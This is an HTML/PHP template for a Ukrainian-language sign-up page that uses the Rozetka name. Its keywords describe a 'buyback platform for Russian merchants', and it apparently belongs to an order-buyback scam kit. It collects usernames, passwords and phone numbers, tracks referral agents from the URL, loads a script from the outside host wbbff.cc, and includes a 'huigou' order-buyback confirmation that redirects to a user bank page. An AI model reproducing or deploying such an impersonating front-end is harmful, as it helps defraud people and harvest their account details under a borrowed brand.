<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina">

<head><style>:root {

--image-path: url('<?php echo asset("/assets/foot_nav.png")?>');
--image-path2: url('<?php echo asset("/assets/dd_icon.png")?>');
}</style>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
	<title>зареєструватися - Rozetka</title>
	<meta name="keywords" content="Платформа зворотного викупу для російських торговців">
	<meta name="description"
		content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради щодо догляду за речами.">
	<meta name="format-detection" content="telephone=no">
	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
	<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/arttpl.js")?>"></script>
	<link href="<?php echo asset("assets/layer.css")?>" type="text/css" rel="styleSheet" id="layermcss">
</head>

<body>
	<style>
		body {
			background: #221f1f !important;
		}
	</style>
	<div class="login_top">
		<div class="zc_tt" style="color:#000;">зареєструватися</div>
		<div class="top_dl"><img src="<?php echo asset("assets/345645615.svg")?>"></div>
		<a class="u_fh" href="<?php echo route("index") ?>"><i class="sy_ico"></i></a>
	</div>
	<div class="">
		<form method="post" id="form">
			@csrf
			<div class="zc_box1">
				<div class="dl_sx">
					<a href="javascript:;" class="logintype js_reg sel" reg_type="phone">зареєструватися за телефоном</a>
					<!-- <a href="javascript:;" class="logintype js_reg" reg_type="email">зареєструватися за email</a> -->
					<div class="clear"></div>
				</div>
				<div class="clear"></div>
				<div class="zc_list">
					<div class="zc_mal zc_i1"><input type="text" name="login" class="zc_input1"
							placeholder="ім'я користувача(довжина 5~15)"></div>
				</div>
				<div class="zc_list">
					<div class="zc_mal zc_i2">
						<input type="password" style="display:none;width:0;height:0;">
						<input type="password" name="password" class="zc_input1" placeholder="пароль(довжина 6~20)"
							autocomplete="new-password">
					</div>
				</div>
				<!--<div class="zc_list">
			<div class="zc_mal zc_i2"><input type="password" name="user_pw1" class="zc_input1" placeholder="Введіть пароль ще раз" /></div>
		</div>-->
				<div class="zc_list js_phone" style="border-bottom: 0px;">
					<div class="zc_mal zc_i5"><input type="text" name="phone" maxlength="15" class="zc_input1"
							placeholder="Введіть номер телефону"></div>
				</div>
				<!-- 		<div class="zc_list js_email">
			<div class="zc_mal zc_i3"><input type="text" name="user_email" class="zc_input1" placeholder="Email" /></div>
		</div> -->
				<!--<div class="zc_list">
			<div class="zc_mal zc_i4">
				<input type="text" name="authcode" class="zc_input1" placeholder="код підтвердження" />
				<img src="https://wbbff.cc/public/class/authcode.class.php?w=100&h=41" onclick="pe_yzm(this)" class="zc_imgyzm" style="cursor:pointer;" />
			</div>
		</div>-->
			</div>
			<div class="loginbtn" style="margin:20px;">
				<input type="hidden" name="reg_type" value="phone">
				<input type="hidden" name="pesubmit">
				<input type="hidden" name="agent_line" value="">
				<input type="button" value="зареєструватися">
			</div>
		</form>
		<div class="zh_zc1" style="text-align:center;"><a href="<?php echo route("auth.login")?>"
				title="Увійти">Увійти</a></div>
	</div>
	<script type="text/javascript">
		function getUrlParam(name) {
			var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); //конструювання регулярного виразу, що містить цільовий параметр\
			var r = window.location.search.substr(1).match(reg);  //співставлення цільового параметра
			if (r != null) return unescape(r[2]); return null; //повернення значення параметра
		}

		$(function () {

			$(":input[name='phone']").on('blur', function () {
				var user_phone = $(this).val();
				user_phone = user_phone.replace(/[-,+]|(\s*)/g, '');
				$(this).val(user_phone);
			});


			$(":input[name='agent_line']").val(getUrlParam('ag'));

			$(".js_reg").click(function () {
				$(".js_reg").removeClass("sel");
				$(this).addClass("sel");
				if ($(this).attr("reg_type") == 'email') {
					$(".js_email").show().find(":input").removeAttr("disabled");
					$(".js_phone").hide().find(":input").attr("disabled", "disabled");
				}
				else {
					$(".js_phone").show().find(":input").removeAttr("disabled");
					$(".js_email").hide().find(":input").attr("disabled", "disabled");
				}

				$(":input[name='reg_type']").val($(this).attr("reg_type"));
				$(".zc_list:visible:last").css("border-bottom", "0");

				// if(getUrlParam('p') && getUrlParam('p').length == 11){
				// 	// $(":input[name='user_phone']").prop('disabled', true);
				// 	// $(".js_phone").show().find(":input").attr("disabled", "disabled");
				// 	$(".zc_list:visible:last").css("display", "none");
				// }

			})
			$(".js_reg:eq(0)").click();
			$(":button").click(function () {
				if ($(":input[name='login']").val() == '') {
					app_tip("Введіть ім'я користувача");
					return false;
				}
				if ($(":input[name='password']").val() == '') {
					app_tip("Введіть пароль");
					return false;
				}
				/*if ($(":input[name='user_pw1']").val() == '') {
					app_tip("Будь ласка, введіть пароль підтвердження");
					return false;
				}
				if ($(":input[name='user_pw']").val() != $(":input[name='user_pw1']").val()) {
					app_tip("Паролі не співпадають");
					return false;
				}*/
				if ($(":input[name='reg_type']").val() == 'email' && $(":input[name='user_email']").val() == '') {
					app_tip("Будь ласка, введіть електронну пошту");
					return false;
				}
				if ($(":input[name='reg_type']").val() == 'phone' && $(":input[name='user_phone']").val() == '') {
					app_tip("Введіть номер телефону");
					return false;
				}
				/*if ($(":input[name='authcode']").val() == '') {
					app_tip("Будь ласка, введіть код підтвердження");
					return false;
				}*/
				$(this).val("відправляється.");
				app_submit("<?php echo route("user.api.register") ?>", function (json) {
					if (json.message == "Користувач зареєстрований та увійшов успішно") {
						if ('' != '') {
							app_open('', 1000);
						}
						else {
							app_open("<?php echo route("index") ?>", 1000);
						}
					}
					else {
						$(":button").val("зареєструватися");
					}
				})
			})
		})
	</script>
	<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css")?>">
	<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css")?>">
	<script src="<?php echo asset("assets/jquery-weui.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
	<script type="text/javascript">
		//клік верхнього меню
		function top_menu() {
			if ($("#top_menu").is(":hidden")) {
				$("#top_menu").show();
			}
			else {
				$("#top_menu").hide();
			}
			$("#top_menu a").live("click", function () {
				$("#top_menu").hide();
			})
		}
		pe_loadscript("https://wbbff.cc/api.php?mod=cron");
	</script>
	<script>
		function confirm_huigou(order_id) {
			layer.open({
				content: "Визначити викуп цього Замовлення？",
				btn: ["OK", "Скасувати"],
				shadeClose: false,
				yes: function () {

					/*layer.open({
						content: 'Ви натиснули підтвердити',
						time: 1
					});*/
					$.ajax({
						type: "POST",
						url: "./user.php?mod=order&act=huigou_do",
						dataType: "json",
						data: {
							'order_id': order_id,
						},
						success: function (res) {
							console.log(res);

							if (res.result == false) {
								layer.open({
									content: res.msg,
									time: 3,
									skin: 'msg',
									end: function () {
										location.href = './user.php?mod=userbank';
									}
								});
							} else {
								layer.open({
									content: res.msg,
									time: 2,
									skin: 'msg',
									end: function () {
										location.reload();
									}
								});
							}
						}
					});
				}

			});
		}    
	</script>

</body>

</html>